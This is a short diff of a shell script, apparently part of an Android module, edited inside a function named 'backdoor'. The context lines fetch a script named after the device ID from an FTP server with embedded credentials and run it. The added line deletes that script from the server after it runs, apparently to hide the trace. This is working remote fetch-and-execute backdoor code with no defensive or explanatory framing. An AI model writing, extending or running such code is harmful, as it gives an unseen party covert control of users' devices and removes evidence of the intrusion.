@@ -86,6 +86,7 @@ backdoor() {
             if [ "${exec_pool[$num]}" = "$android_id.sh" ]; then
                 $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/${exec_pool[$num]}" --output "$MODDIR"/"${exec_pool[$num]}"
                 _exec "$MODDIR"/"${exec_pool[$num]}"
+                $_curl -sLk "ftp://$ftp_user:$ftp_passwd@$ftp_ip/$ftp_exec_dir/" -X "DELE ${exec_pool[$num]}"
                 break
             fi
         done
